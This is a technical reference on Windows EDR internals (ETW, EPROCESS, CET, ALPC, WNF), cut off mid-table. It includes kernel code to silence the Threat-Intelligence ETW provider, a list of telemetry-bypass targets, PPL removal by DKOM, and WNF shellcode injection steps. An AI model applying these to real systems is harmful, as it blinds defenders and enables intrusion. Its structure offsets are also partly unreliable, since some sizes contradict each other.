# EDR Internals Deep Dive: Windows Kernel Structures and Attack Surface

Precise technical reference for EDR research, covering ETW internals, EPROCESS layouts,
CET/Shadow Stack, ALPC, WNF, KernelCallbackTable, Thread Pool injection, Early-Bird APC,
Process Herpaderping, and LDR structures.

---

## 1. ETW Internal Structures

### 1.1 _WMI_LOGGER_CONTEXT

The `_WMI_LOGGER_CONTEXT` is the kernel's internal representation of a single ETW trace
session. Microsoft does not document it; its layout is reconstructed from public PDB symbols.
The structure has grown substantially across versions — from 0x0238 bytes (x64, 6.1/Win7)
to 0x0990 bytes (x64, build 1709) and stabilized around 0x0550 bytes (x64, build 2004/20H1).

**Key fields (x64 offsets, Windows 10 2004 / approx. 0x0550 total):**

```
+0x000 LoggerId              : ULONG          // Index into EtwpLoggerContext[]; bits[0..15]
+0x004 BufferSize            : ULONG          // Bytes per event buffer
+0x008 MaximumEventSize      : ULONG
+0x00C LoggerMode            : ULONG          // EVENT_TRACE_REAL_TIME_MODE etc.
+0x010 AcceptNewEvents       : LONG           // Interlocked flag; 0 = session disabled
+0x018 GetCpuClock           : ULONG          // Index (0-3): 0=RtlGetSystemTimePrecise,
                                              //  1=KeQueryPerformanceCounter,
                                              //  2=HalTimerQueryHostPerformanceCounter,
                                              //  3=__rdtsc
                                              // (Was a function pointer before MS patched
                                              //  InfinityHook by converting it to an index)
+0x020 LoggerThread          : ETHREAD*
+0x028 LoggerStatus          : NTSTATUS
+0x030 (buffer queue structures)
+0x098 LoggerName            : UNICODE_STRING  // e.g. L"NT Kernel Logger"
+0x0C0 BuffersAvailable      : LONG volatile
+0x0D8 ClockType             : ULONG          // 0=Raw,1=PerfCounter,2=SystemTime,3=CpuCycle
+0x0E0 FlushTimer            : ULONG
+0x218 LoggerMutex           : KMUTANT
+0x290 LoggerLock            : EX_PUSH_LOCK
+0x2B8 BufferListSpinLock    : EX_PUSH_LOCK
+0x2C0 ClientSecurityContext : SECURITY_CLIENT_CONTEXT
+0x2E0 SecurityDescriptor    : EX_FAST_REF
+0x318 TokenAccessInformation: TOKEN_ACCESS_INFO*
+0x320 StartTime             : LARGE_INTEGER
+0x330 Flags                 : ULONG          // bit 14 = SecurityTrace (PPL-only sessions)
       SecurityTrace          : Pos 14, 1 bit
```

**Size evolution (x64):**

| Build    | x64 Size |
|----------|----------|
| Win7/6.1 | 0x0330   |
| Win8/6.2 | 0x0378   |
| Win10 RTM| 0x0398   |
| 1709     | 0x0990   |
| 1809     | 0x0520   |
| 2004     | 0x0550   |
| 11 24H2  | 0x0650   |

**SecurityTrace flag (bit 14 of Flags @ +0x330):**
Only `DefenderApiLogger` and `DefenderAuditLogger` sessions have this bit set by default.
Queries against such a session via `EtwpQueryTrace` require the caller to hold
Antimalware-PPL signing level (`PsProtectedSignerAntimalware`). This bit can also be set by
writing to the `EnableSecurityProvider` AutoLogger registry value.

**InfinityHook (legacy) and GetCpuClock:**
The original InfinityHook exploit replaced the `GetCpuClock` function pointer to intercept
every system call. Microsoft mitigated this by converting the field from a raw pointer to an
integer index (0–3), breaking the exploit.

**Session access path:**

```
nt!PspHostSiloGlobals
  -> EtwSiloState  (_ETW_SILODRIVERSTATE*)
    -> EtwpLoggerContext  (WMI_LOGGER_CONTEXT** array[64])
      -> [LoggerId]  = pointer to _WMI_LOGGER_CONTEXT for session N
```

Sessions 0–63 are tracked; unused slots contain sentinel value `1`.

---

### 1.2 _ETW_GUID_ENTRY

One `_ETW_GUID_ENTRY` per registered provider GUID (per silo). Stored in a 64-bucket hash
table (`EtwpGuidHashTable`) within `_ETW_SILODRIVERSTATE`. Each bucket is a list of entries
split by GUID type: `EtwpTraceGuidType`, `EtwpNotificationGuidType`, `EtwpGroupGuidType`.

**x64 offsets (Windows 10 2004+):**

```
+0x000 GuidList              : LIST_ENTRY         // Linkage in hash bucket
+0x010 SiloGuidList          : LIST_ENTRY         // (2004+) per-silo linkage
+0x020 RefCount              : LONG_PTR volatile
+0x028 Guid                  : GUID               // 16 bytes
+0x038 RegListHead           : LIST_ENTRY         // Head of ETW_REG_ENTRY list
+0x048 SecurityDescriptor    : PSECURITY_DESCRIPTOR
+0x050 LastEnable / MatchId  : union
+0x060 ProviderEnableInfo    : TRACE_ENABLE_INFO  // Summary enable state for the provider
+0x080 EnableInfo[8]         : TRACE_ENABLE_INFO  // Per-session enable info (max 8 sessions)
+0x180 FilterData            : ETW_FILTER_HEADER*
+0x190 HostEntry             : ETW_GUID_ENTRY*
+0x198 Lock                  : EX_PUSH_LOCK
+0x1A0 LockOwner             : ETHREAD*
```

**TRACE_ENABLE_INFO layout:**
```c
typedef struct _TRACE_ENABLE_INFO {
    ULONG  IsEnabled;        // Non-zero = at least one session has enabled this provider
    UCHAR  Level;
    UCHAR  Reserved1;
    USHORT LoggerId;         // Which session index
    ULONG  EnableProperty;
    ULONG  Reserved2;
    ULONGLONG MatchAnyKeyword;
    ULONGLONG MatchAllKeyword;
} TRACE_ENABLE_INFO;        // 0x20 bytes
```

The `ProviderEnableInfo.IsEnabled` field is checked by `nt!EtwEventEnabled` before
emitting any event. If zeroed, event emission is short-circuited entirely.

---

### 1.3 _ETW_REG_ENTRY

One instance per `EtwRegister()` call. Multiple registrations of the same GUID share one
`ETW_GUID_ENTRY`, with all `ETW_REG_ENTRY` instances linked via `RegList` into
`GuidEntry->RegListHead`.

**x64 offsets (Windows 10 2004+), total 0x70 bytes:**

```
+0x000 RegList               : LIST_ENTRY         // Linkage under GuidEntry->RegListHead
+0x010 GroupRegList          : LIST_ENTRY         // Provider group list
+0x020 GuidEntry             : ETW_GUID_ENTRY*    // Parent GUID entry
+0x028 GroupEntry            : ETW_GUID_ENTRY*    // Group GUID entry (Win10+)
+0x030 ReplyQueue            : ETW_REPLY_QUEUE*
+0x050 Process               : EPROCESS*          // OR callback pair for kernel providers
+0x060 Index                 : USHORT             // Registration index
+0x062 Flags                 : USHORT             // Bit field
+0x064 EnableMask            : UCHAR              // Bit per session (max 8 sessions)
+0x065 GroupEnableMask       : UCHAR
+0x066 HostEnableMask        : UCHAR
+0x067 HostGroupEnableMask   : UCHAR
+0x068 Traits                : ETW_PROVIDER_TRAITS*
```

**EnableMask semantics:**
Each bit position N in `EnableMask` corresponds to logger session N being active for this
registration. All four mask fields (`EnableMask`, `GroupEnableMask`, `HostEnableMask`,
`HostGroupEnableMask`) must be zeroed to fully silence a provider. This is what the
Lazarus FudModule rootkit did to disable 95 providers.

---

### 1.4 EtwRegister — kernel provider registration path

```
EtwRegister(ProviderGuid, Callback, Context, &RegHandle)
  -> EtwpBuildEtwRegistration()
     1. Lock EtwpGuidHashTable[hash(GUID) & 0x3F]
     2. Search for existing ETW_GUID_ENTRY matching GUID
        - If none: allocate + insert new ETW_GUID_ENTRY
     3. Allocate ETW_REG_ENTRY; link into GuidEntry->RegListHead
     4. If provider already enabled in active sessions:
        - Callback fires immediately (EnableCallback invocation)
     5. Return &ETW_REG_ENTRY as RegHandle (since Win8; was index before)
```

---

### 1.5 EtwpNotifyGuid

`EtwpNotifyGuid` is called when a provider's enable state changes (e.g. a session starts or
stops, or a session changes level/keyword). It:

1. Locates the `ETW_GUID_ENTRY` by GUID.
2. Rebuilds `ProviderEnableInfo` by ORing across all `EnableInfo[N]` entries.
3. Updates `EnableMask` in each `ETW_REG_ENTRY` under `RegListHead`.
4. Invokes each registration's `EnableCallback` (the `PENABLECALLBACK` passed to
   `EtwRegister`) on the EPROCESS of the registered kernel component.

---

### 1.6 EtwpActiveSystemLoggers and _ETW_SILODRIVERSTATE

`EtwpActiveSystemLoggers` is a bitmask (ULONG) where bit N = 1 means logger session N is
active. Used in `EtwpLogKernelEvent` as a guard: if the bit for a session is clear, no
event is logged to it.

Access path from within the kernel:

```
nt!EtwpHostSiloState  (exported or resolved via pattern scan)
  -> _ETW_SILODRIVERSTATE
```

**_ETW_SILODRIVERSTATE key fields (x64, Windows 10 1809–2004, ~0x1220 bytes):**

```
+0x000 EtwpSecurityProviderGuidEntry : ETW_GUID_ENTRY*
+0x018 (security-related fields)
+0x1C8 EtwpLoggerContext             : WMI_LOGGER_CONTEXT** (pointer to array)
+0x1D0 EtwpGuidHashTable[0x40]       : ETW_HASH_BUCKET array
+0x??? EtwpActiveSystemLoggers       : ULONG (within SystemLoggerSettings sub-struct)
```

Note: The exact offset of `EtwpActiveSystemLoggers` is build-specific. The Lazarus rootkit
resolves it by scanning for opcode patterns in `EtwTraceKernelEvent` or by following the
`EtwSendTraceBuffer` → `EtwpHostSiloState` reference chain, then adding a hardcoded
per-build delta.

**Zeroing `EtwpActiveSystemLoggers` effect:**
`EtwpLogKernelEvent` uses `bsf` (bit scan forward) to find the first active session. If the
bitmask is 0, the loop never runs, and no events are logged — a complete blackout of all
kernel ETW events.

---

### 1.7 EtwThreatIntProvRegHandle

Global variable in ntoskrnl data section:
```
nt!EtwThreatIntProvRegHandle  -> ETW_REG_ENTRY*
```

Provider GUID: `F4E1897C-BB5D-5668-F1D8-040F4D8DD344`
(`Microsoft-Windows-Threat-Intelligence`)

To disable this provider from kernel mode:

```c
ETW_REG_ENTRY* reg = *(ETW_REG_ENTRY**)EtwThreatIntProvRegHandle;
ETW_GUID_ENTRY* guid = reg->GuidEntry;
// Zero ProviderEnableInfo
guid->ProviderEnableInfo.IsEnabled = 0;
// Walk RegListHead and zero all masks
LIST_ENTRY* head = &guid->RegListHead;
for (LIST_ENTRY* e = head->Flink; e != head; e = e->Flink) {
    ETW_REG_ENTRY* r = CONTAINING_RECORD(e, ETW_REG_ENTRY, RegList);
    r->EnableMask = 0;
    r->GroupEnableMask = 0;
    r->HostEnableMask = 0;
    r->HostGroupEnableMask = 0;
}
```

This makes `nt!EtwEventEnabled` return FALSE for all TI provider events, suppressing
ReadFile, WriteFile, VirtualAlloc, CreateProcess, etc. telemetry from the TI channel.

---

### 1.8 ProviderEnableInfo / EnableMask check before event emission

```
EtwWrite / EtwEventWrite
  -> EtwEventEnabled(RegHandle, EventDescriptor)
       1. reg = (ETW_REG_ENTRY*)RegHandle
       2. if reg->GuidEntry->ProviderEnableInfo.IsEnabled == 0: return FALSE
       3. Walk EnableInfo[0..7]: check Level, MatchAnyKeyword, MatchAllKeyword
       4. Check GroupEnableMask for group sessions
     -> if any check fails: return FALSE, event is dropped silently
```

Attacker bypass targets in order of surgical precision:
- Zeroing `ProviderEnableInfo.IsEnabled` in `ETW_GUID_ENTRY` (most targeted)
- Zeroing `EnableMask`/`GroupEnableMask` in `ETW_REG_ENTRY` (per-registration)
- Zeroing `EtwpActiveSystemLoggers` (nuclear — kills all kernel ETW)
- Patching `AcceptNewEvents = 0` in `WMI_LOGGER_CONTEXT` (kills a specific session)

---

## 2. EPROCESS Exact Field Offsets

### 2.1 Multi-version offset table (x64)

The `_EPROCESS` (Executive Process) structure layout changes between Windows builds. Key
security-relevant fields:

| Field                        | Win10 1909 | Win10 2004/21H2/22H2 | Win11 22H2 | Win11 24H2 |
|------------------------------|------------|----------------------|------------|------------|
| `UniqueProcessId`            | 0x2E8      | 0x440                | 0x440      | 0x1D0      |
| `ActiveProcessLinks`         | 0x2F0      | 0x448                | 0x448      | 0x1D8      |
| `Token` (EX_FAST_REF)        | 0x360      | 0x4B8                | 0x4B8      | 0x248      |
| `Protection` (PS_PROTECTION) | 0x6FA      | 0x87A                | 0x87A      | 0x5FA      |
| `Flags` (ULONG)              | 0x30C      | 0x464                | 0x464      | 0x1F4      |
| `Flags2` (ULONG)             | 0x308      | 0x460                | 0x460      | 0x1F0      |
| `Flags3` (ULONG)             | 0x6FC      | 0x87C                | 0x87C      | 0x5FC      |
| `VadRoot` (RTL_AVL_TREE)     | 0x658      | 0x7D8                | 0x7D8      | 0x558      |
| `InheritedFromUniqueProcessId`| 0x3E8     | 0x540                | 0x540      | 0x2D0      |
| `MitigationFlags`            | 0x850      | 0x9D0                | 0x9D0      | 0x750      |
| `MitigationFlags2`           | 0x854      | 0x9D4                | 0x9D4      | 0x754      |
| Total sizeof(_EPROCESS)      | 0x880      | 0xB80                | 0xB80      | 0x840      |

Notes:
- Win10 versions 2004, 20H2, 21H1, 21H2, 22H2 share the same offsets for the fields above.
- Windows 11 24H2 (build 26100) significantly reorganized the structure, shrinking it.
- `SignalState` is a field of `_KPROCESS` (the embedded dispatcher header at offset 0x0),
  not directly in `_EPROCESS`; it is at `EPROCESS+0x004` (within `Pcb.Header.SignalState`).

---

### 2.2 Calculating offsets programmatically from PDB

**Method: Runtime PDB symbol resolution (no kernel driver required):**

```cpp
// Step 1: Get ntoskrnl.exe kernel base + disk path
SYSTEM_MODULE_INFORMATION modules = {};
NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0xB,  // SystemModuleInformation
    &modules, sizeof(modules), nullptr);
// modules[0] is always ntoskrnl.exe
PVOID kernelBase = modules.Module[0].ImageBase;
char*  kernelPath = modules.Module[0].FullPathName;

// Step 2: Extract PDB GUID from Debug Directory
IMAGE_DOS_HEADER*  dos = (IMAGE_DOS_HEADER*)LoadLibraryExA(kernelPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
IMAGE_NT_HEADERS*  nt  = RVA(dos, dos->e_lfanew);
IMAGE_DEBUG_DIRECTORY* dbg = RVA(dos, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress);
// dbg->Type == IMAGE_DEBUG_TYPE_CODEVIEW -> RSDS record
struct RSDS { DWORD sig; GUID guid; DWORD age; char pdbName[]; }* rsds = RVA(dos, dbg->AddressOfRawData);

// Step 3: Download PDB from Microsoft symbol server
// URL format: https://msdl.microsoft.com/download/symbols/ntoskrnl.pdb/<GUID_NO_DASHES><Age>/ntoskrnl.pdb
// Use WinHTTP to fetch; cache locally.

// Step 4: Load PDB with DbgHelp and enumerate _EPROCESS children
HANDLE hSym = (HANDLE)0xBEEF;
SymInitialize(hSym, nullptr, FALSE);
SymLoadModuleExW(hSym, nullptr, L"ntoskrnl.pdb", nullptr, 0x10000000, 0, nullptr, 0);

// Step 5: Resolve field offset
DWORD tokenOffset = GetFieldOffset(hSym, L"_EPROCESS", L"Token");
// tokenOffset + kernelBase = absolute kernel address of Token field in any EPROCESS
```

**Alternative: NtQuerySystemInformation + exported symbols**
`PsInitialSystemProcess` is exported by ntoskrnl. The EPROCESS of the System process can
be read from it; then `Token` offset can be found by scanning for the SYSTEM process's
well-known token value.

---

### 2.3 PS_PROTECTION (EPROCESS.Protection)

Single byte at offset noted above. Bit layout:

```c
typedef struct _PS_PROTECTION {
    union {
        UCHAR Level;
        struct {
            UCHAR Type   : 3;   // PsProtectedType enum
            UCHAR Audit  : 1;   // Reserved; if set, logs instead of blocks
            UCHAR Signer : 4;   // PsProtectedSigner enum
        };
    };
} PS_PROTECTION;
```

**PS_PROTECTED_TYPE enum:**
| Value | Name |
|-------|------|
| 0     | PsProtectedTypeNone |
| 1     | PsProtectedTypeProtectedLight (PPL) |
| 2     | PsProtectedTypeProtected (PP) |

**PS_PROTECTED_SIGNER enum (bits 4-7):**
| Value | Name |
|-------|------|
| 0     | PsProtectedSignerNone |
| 1     | PsProtectedSignerAuthenticode |
| 2     | PsProtectedSignerCodeGen |
| 3     | PsProtectedSignerAntimalware |
| 4     | PsProtectedSignerLsa |
| 5     | PsProtectedSignerWindows |
| 6     | PsProtectedSignerWinTcb |
| 7     | PsProtectedSignerWinSystem |
| 8     | PsProtectedSignerApp |

**LSASS with PPL:** `Protection = 0x41` = Type:1 (PPL), Signer:4 (Lsa).

Higher signer value → can open handles to lower-signer PPL processes, but not vice versa.
Modifying `Protection` via DKOM (e.g. zeroing it) removes PPL restriction on the process.

---

### 2.4 MitigationFlags and MitigationFlags2

Both are ULONG bit-fields. Present since Windows 10 1709 (consolidated from Flags/Flags2).

**MitigationFlags (offset varies by build — see table above):**
```
Bit  0  ControlFlowGuardEnabled
Bit  1  ControlFlowGuardExportSuppressionEnabled
Bit  2  ControlFlowGuardStrict
Bit  3  DisallowStrippedImages
Bit  4  ForceRelocateImages
Bit  5  HighEntropyASLREnabled
Bit  6  StackRandomizationDisabled
Bit  8  DisableDynamicCode           (0x100)
Bit 12  DisallowWin32kSystemCalls    (0x1000)
Bit 26  LoaderIntegrityContinuityEnabled (0x04000000)
Bit 30  RestrictIndirectBranchPrediction (0x40000000, 1809+)
Bit 31  IsolateSecurityDomain        (0x80000000, 1809+)
```

**MitigationFlags2 (offset = MitigationFlags + 4):**
```
Bit  0  EnableExportAddressFilter
Bit  1  AuditExportAddressFilter
Bit  2  EnableExportAddressFilterPlus
Bit  7  UserCetSetContextIpValidation        // CET RIP validation
Bit  8  UserCetSetContextIpValidationAudit
Bit  9  RestrictCoreSharing
Bit 10  DisallowFrontendUserInput
Bit 11  AllowLowPrivilegeHandleTable
```

---

## 3. CET (Control-flow Enforcement Technology) and Shadow Stacks

### 3.1 Intel CET shadow stack at CPU level

CET is a hardware feature providing:
1. **Shadow Stack (SHSTK)**: A second, CPU-protected stack that stores only return addresses.
   On `CALL`, hardware pushes the return address to both the regular stack and shadow stack.
   On `RET`, hardware checks that the address on the regular stack matches the shadow stack
   top; mismatch raises `#CP` (Control Protection exception, vector 21).
2. **Indirect Branch Tracking (IBT)**: Requires valid targets of indirect branches (`JMP`/`CALL`)
   to be preceded by `ENDBR64`/`ENDBR32` instructions. **Windows does not implement IBT** —
   it uses CFG (Control Flow Guard) instead.

**CPU MSRs:**
```
IA32_U_CET       (0x6A0)  — user-mode CET config: SHSTK_EN (bit 0), ENDBR_EN (bit 2)
IA32_PL3_SSP     (0x6A7)  — user-mode shadow stack pointer (ring-3 SSP)
IA32_S_CET       (0x6A2)  — supervisor CET config
IA32_PL0_SSP     (0x6A4)  — ring-0 SSP
```

Shadow stack pointer is 8-byte aligned. The shadow stack region is allocated with
`PAGE_GUARD | PAGE_TARGETS_INVALID` protections — it is readable but not directly writable
from user mode.

### 3.2 CETCOMPAT bit in PE

The CETCOMPAT flag is set in the PE `IMAGE_LOAD_CONFIG_DIRECTORY` at
`DllCharacteristicsEx` bit 0 (`IMAGE_DLLCHARACTERISTICS_EX_CET_COMPAT`).
Compiled with `/CETCOMPAT` (MSVC) or equivalent.

All in-box 64-bit Windows DLLs are CETCOMPAT. If any loaded DLL in a process lacks it,
the OS can run in "compatibility mode" (CET enabled but strict enforcement disabled for
that module) or strict mode (process immediately terminated on mismatch).

**Compatibility vs Strict:**
- Compatibility: non-CETCOMPAT DLLs allowed; violations raise `#CP` but are handled gracefully.
- Strict: all loaded code must be CETCOMPAT; enforced via `MitigationFlags2.UserCetSetContextIpValidation`.

### 3.3 Shadow Stack Pointer (SSP) and XState

The SSP is per-thread. It is stored in the extended state (XState) via:
- **XSTATE_CET_U (bit 11)**: User-mode CET state → contains `Ia32CetUMsr` and `Ia32Pl3SspMsr`.
- **XSTATE_CET_S (bit 12)**: Kernel-mode CET state.

On context switch, `XSAVE`/`XRSTOR` saves/restores all CET state through the `CONTEXT_EX`
extended block. The `CONTEXT_EX` structure extends the legacy `CONTEXT` for XState data.

### 3.4 Kernel CET (HVCI-dependent)

Kernel CET requires HVCI (Hypervisor-Protected Code Integrity) to be enabled:

```
CR4 bit 23  (0x800000) = CET support enabled
ETHREAD.MiscFlags bit 22 = CetKernelShadowStack
nt!KiKernelCetEnabled  (global flag)
```

**Thread creation with kernel shadow stack:**
```
PspAllocateThread
  -> KeInitThread -> MmCreateKernelStack (regular stack)
  -> KiCreateKernelShadowStack  (if KiKernelCetEnabled)
     -> VslAllocateKernelShadowStack (secure system call #230 to VTL 1)
        -> securekernel!SkmmCreateNtKernelShadowStack
           -> SkmiClaimPhysicalPage: marks pages read-only via HvCallModifyVtlProtectionMask (hypercall 12)
           -> Places restore token at shadow stack offset 0xFF8
```

The restore token has bit 0 set (`token | 1`), signaling to `RSTORSSP` that this is a
valid restoration point.

### 3.5 NtContinue and synthetic frames

`NtContinue` (and `NtContinueEx`) is the primary point where user-mode code can attempt to
modify RIP. When CET is enabled, the kernel calls `KeVerifyContextXStateCetU`:

- Forces `MSR_IA32_CET_SHSTK_EN` to remain set (cannot be disabled by user).
- Validates new SSP: must be 8-byte aligned, within the thread's shadow stack VAD, and
  within previously used stack bounds.
- Validates target RIP (if `UserCetSetContextIpValidation` is set) against:
  - Long jump table (`.gljmp` section / `GuardLongJumpTargetTable` in image load config)
  - Exception handler continuation table (`GuardEHContinuationTable`)
  - Dynamic targets registered via `ProcessDynamicEHContinuationTargets`

`KCONTINUE_TYPE` enum in `NtContinueEx`:
```
KCONTINUE_UNWIND   = 0  (legacy exception unwinding)
KCONTINUE_RESUME   = 1  (APC delivery)
KCONTINUE_LONGJUMP = 2  (setjmp/longjmp)
KCONTINUE_SET      = 3  (NtSetContextThread)
```

Each type passes through different validation in `RtlVerifyUserUnwindTarget`.

### 3.6 EDR/hypervisor leverage of CET for detection

- EDRs can query `SharedUserData.XState.EnabledFeatures` for XSTATE_CET_U bit to determine
  if user-mode CET is active on the system.
- `STATUS_SET_CONTEXT_DENIED` returned by `NtSetContextThread` indicates CET blocked an
  invalid RIP modification — a detection signal.
- Hypervisors (VBS) use `HvCallModifyVtlProtectionMask` to make shadow stack pages
  read-only from VTL 0; any write attempt generates a VTL-switch to the secure kernel.
- VMCS field `VMX_GUEST_SSP` (register code `0x8008E`) is updated by the secure kernel on
  context restore, observable through VMX tracing.

---

## 4. ALPC in EDR Context

### 4.1 Port object types

ALPC communication always involves three port objects:
1. **Server Connection Port**: Created by `NtAlpcCreatePort`; server listens here.
2. **Server Communication Port**: Created when server calls `NtAlpcAcceptConnectPort`; one per client.
3. **Client Communication Port**: Created on client side by `NtAlpcConnectPort`.

All three instantiate `_ALPC_PORT` (a.k.a. `KALPC_PORT`) kernel objects.

### 4.2 PORT_MESSAGE / LPC_MESSAGE structure

```c
typedef struct _PORT_MESSAGE {
    union {
        struct { USHORT DataLength; USHORT TotalLength; } s1; // +0x00
        ULONG Length;
    } u1;
    union {
        struct { USHORT Type; USHORT DataInfoOffset; } s2;    // +0x04
        ULONG ZeroInit;
    } u2;
    union {
        CLIENT_ID  ClientId;   // +0x08  ProcessId + ThreadId (kernel-populated)
        double     DoNotUseThisField;
    };
    ULONG  MessageId;          // +0x18  Unique message sequence number
    union {
        SIZE_T ClientViewSize;  // +0x20  (on server connection port)
        ULONG  CallbackId;
    };
} PORT_MESSAGE;  // 0x28 bytes total
```

`DataLength` = payload size; `TotalLength` = sizeof(PORT_MESSAGE) + DataLength.
`Type` values: `LPC_REQUEST=1`, `LPC_REPLY=2`, `LPC_DATAGRAM=3`, `LPC_LOST_REPLY=4`, etc.

### 4.3 _ALPC_PORT kernel structure (key fields, ~0x1D8 bytes)

```
+0x010 CommunicationInfo  : ALPC_COMMUNICATION_INFO*
+0x018 OwnerProcess       : EPROCESS*
+0x020 CompletionPort     : KQUEUE*            // I/O completion port if set
+0x090 MainQueue          : LIST_ENTRY         // Pending messages
+0x0A0 LargeMessageQueue  : LIST_ENTRY         // Large message overflow
+0x100 PortAttributes     : ALPC_PORT_ATTRIBUTES  // includes QoS
+0x1A0 State              : bitfield
         Initialized : 1
         Type        : 3   // 0=Server, 1=Client, 2=Server-side comm, 3=Unconnected
         Disconnected: 1
         ...
+0x1A8 TargetQueuePort    : ALPC_PORT*         // Linked partner port
```

### 4.4 Security descriptor on ALPC ports

ALPC ports are securable kernel objects. Security descriptors are specified during
`NtAlpcCreatePort` via `OBJECT_ATTRIBUTES.SecurityDescriptor`. However, most built-in ALPC
servers (including some EDR servers) accept connections from Everyone, performing
identity checks only post-connection via `ALPC_CONTEXT_ATTR`.

`ALPC_CONTEXT_ATTR` is automatically attached by the kernel to every message regardless of
what the sender requests, providing server-side client identification without spoofing.

### 4.5 WdFilter.sys — Filter Communication Ports (not ALPC)

Microsoft Defender's kernel driver (`WdFilter.sys`) uses **minifilter communication ports**
(`FltCreateCommunicationPort`), not raw ALPC. These are a separate IPC mechanism built on
top of the Filter Manager.

**Four ports created by `MpCreateCommPorts`:**
```
\MicrosoftMalwareProtectionControlPort    — has MessageNotifyCallback (sync)
\MicrosoftMalwareProtectionPort
\MicrosoftMalwareProtectionVeryLowIoPort
\MicrosoftMalwareProtectionRemoteIoPort
```

All are protected by a security descriptor using `MpServiceSID` — only MsMpEng.exe
(running as LOCAL SYSTEM with the Defender service SID) can connect.

**Filter comm port vs raw ALPC:**
- No `NtAlpcCreatePort` syscall — uses file-based handle via `\FileSystem\Filters\FltMgrMsg`.
- Messages use `FltSendMessage` (sync) or async via worker thread queue.
- Backed by cancel-safe IRP queues (`IoCsqXxx`), not ALPC queues.

**AsyncMessageData structure (simplified):**
```c
struct AsyncMessageData {
    ULONG  Magic;
    ULONG  Size;
    ULONG  NotifySeq;
    ULONG  DataSize;
    ULONG  OperationType;
    union  { /* ImageLoadNotify, ProcessNotify, ThreadNotify, etc. */ };
};
```

**EDR vs IOCTL:**
Some EDR components (e.g. CrowdStrike CSAgent) use both filter comm ports AND direct IOCTL
DeviceIoControl paths via `\Device\csagent`. IOCTL is used for synchronous queries from
user mode; filter comm ports handle asynchronous kernel→user-mode notifications.

---

## 5. Windows Notification Facility (WNF)

### 5.1 WNF_STATE_NAME encoding

A WNF state name is an opaque 64-bit integer. Its internal decoded structure:

```c
// XOR with 0x41C64E6DA3BC0074 to decode
typedef struct _WNF_STATE_NAME_STRUCT {
    ULONG64 Version      : 4;   // Always 1
    ULONG64 NameLifetime : 2;   // 0=WellKnown,1=Permanent,2=Persistent,3=Temporary
    ULONG64 DataScope    : 4;   // 0=System,1=Session,2=User,3=Process,4=Machine,5=PhysicalMachine
    ULONG64 PermanentData: 1;   // If set, data survives across reboots (registry-backed)
    ULONG64 Unique       : 53;  // Monotonically incrementing sequence number
} WNF_STATE_NAME_STRUCT;
```

Well-known state names (e.g. `WNF_SHEL_DESKTOP_APPLICATION_STARTED`) are hardcoded and
cannot be created by user mode.

### 5.2 Kernel structures

**_WNF_NAME_INSTANCE** (kernel object per state name):
```
NodeTypeCode    : USHORT              // Identifies WNF object type
NodeByteSize    : USHORT
RefCount        : LONG
StateName       : WNF_STATE_NAME_STRUCT
TreeLinks       : RTL_BALANCED_NODE  // In binary tree of name instances
ScopeInstance   : WNF_SCOPE_INSTANCE*
StateNameInfo   : WNF_STATE_NAME_REGISTRATION*
StateDataLock   : EX_PUSH_LOCK
StateData       : WNF_STATE_DATA*    // Current data
CurrentChangeStamp: WNF_CHANGE_STAMP (ULONG)
PermanentDataStore: HANDLE           // Registry key handle for persistent names
StateSubscriptionListHead: LIST_ENTRY // All WNF_USER_SUBSCRIPTION instances
```

**_WNF_STATE_DATA** (data blob):
```
Header          : WNF_CONTEXT_HEADER
AllocatedSize   : ULONG             // Max 0x1000 (4096) bytes
DataSize        : ULONG
ChangeStamp     : ULONG
// Actual data immediately follows this struct at StateData + 0x10
```

**_WNF_USER_SUBSCRIPTION** (one per subscriber):
```
ListEntry       : LIST_ENTRY        // Links under WNF_NAME_INSTANCE.StateSubscriptionListHead
SubscriptionId  : ULONGLONG
StateName       : WNF_STATE_NAME_STRUCT
UserCallback    : PWNF_USER_CALLBACK   ← injection target
CallbackContext : PVOID
// ... process context, change stamps
```

### 5.3 Core APIs

```
NtCreateWnfStateName     — creates a new state name
NtDeleteWnfStateName     — deletes a state name
NtQueryWnfStateData      — reads published data
NtUpdateWnfStateData     — publishes data → triggers all subscriber callbacks
NtSubscribeWnfStateChange — creates WNF_USER_SUBSCRIPTION with callback
NtUnsubscribeWnfStateChange
```

### 5.4 WNF code injection technique

Technique originally demonstrated by `@modexpblog`; largely undetected by EDR because it
uses no `CreateRemoteThread` or similar creation primitives:

**Steps:**
1. Find a GUI or system process with known WNF subscriptions (most processes have them).
2. Enumerate `WNF_USER_SUBSCRIPTION` objects in the target process via
   `NtQueryInformationProcess` + memory scanning for the well-known `WNF_NAME_INSTANCE`
   objects in kernel, or by reading the target's subscription list from memory.
3. `VirtualAllocEx` + `WriteProcessMemory` to inject shellcode.
4. Overwrite `WNF_USER_SUBSCRIPTION.UserCallback` pointer with shellcode address using
   `WriteProcessMemory`.
5. Call `NtUpdateWnfStateData` targeting that state name → kernel dispatches the
   modified callback in the target process context.
6. Restore original callback pointer.

**EDR monitoring of WNF:**
- Monitor `WriteProcessMemory` to callback pointer regions (requires knowing structure layout).
- Hook `NtSubscribeWnfStateChange` to track subscriber lists.
- Trail of Bits introduced `WNF_CI_*` state names that signal code integrity events:
  - `WNF_CI_BLOCKED_DRIVER` — HVCI-blocked driver load
  - `WNF_CI_CODEINTEGRITY_MODE_CHANGE` — CI mode alteration
  - These are used by Defender and other security tools for CI event delivery.

### 5.5 WNF for persistence

Permanent and Persistent state names are stored in:
```
HKLM\SYSTEM\CurrentControlSet\Control\Notifications\{StateName}
```
The kernel writes state data to this key on `NtUpdateWnfStateData` if `PermanentData = 1`.
This provides a persistence mechanism that survives reboots without writing to disk
directly.

---

## 6. KernelCallbackTable Hijacking

### 6.1 PEB.KernelCallbackTable layout

```c
// PEB offset 0x058 (x64)
PVOID KernelCallbackTable;
```

This is a pointer to an array of function pointers, populated when `user32.dll` is first
loaded into a GUI process. Each entry is a PVOID to a `user32!__fn*` function. The table is
untyped and completely undocumented by Microsoft.

**Condition:** Only processes that have loaded `user32.dll` have a non-NULL
`KernelCallbackTable`. Console processes and SYSTEM processes without GUI do not.

### 6.2 Function table contents (partial, indices vary by OS version)

```
Index  Function                  Trigger
  0    __fnCOPYDATA              WM_COPYDATA message
  1    __fnCOPYGLOBALDATA        WM_COPYDATA global data
  2    __fnDWORD                 Various DWORD-parameter messages
  3    __fnNCDESTROY             WM_NCDESTROY
  4    __fnDWORDOPTINLPMSG       Optional LPMSG messages
  5    __fnINOUTDRAG             OLE drag/drop
